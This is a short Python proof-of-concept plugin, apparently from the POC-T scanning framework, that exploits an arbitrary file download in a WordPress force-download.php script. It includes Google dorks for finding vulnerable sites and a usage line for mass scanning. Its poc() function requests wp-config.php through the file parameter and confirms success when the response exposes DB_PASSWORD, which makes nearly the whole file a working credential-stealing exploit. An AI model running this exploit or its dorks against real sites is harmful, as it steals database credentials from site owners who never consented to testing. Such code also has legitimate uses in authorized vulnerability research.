#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Wordpress force download Arbitrary File Download

Dork
  inurl:force-download.php?file=wp-content/uploads
  inurl:wp-content/uploads
  inurl:force-download.php?file=

Usage
  python POC-T.py -s wp-forcedownload -aG "inurl:force-download.php?file="

Vendor Homepage
  http://elouai.com/force-download.php

"""

import urllib2
from plugin.urlparser import iterate_path


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    payload = '/force-download.php?file=wp-config.php'
    for i in iterate_path(url):
        if '?' in i:
            continue
        target = i.rstrip('/') + payload
        try:
            r = urllib2.urlopen(target).read()  # cannot use requests here
            if 'define(' in r and 'DB_PASSWORD' in r:
                return target
        except Exception, e:
            pass
    return False
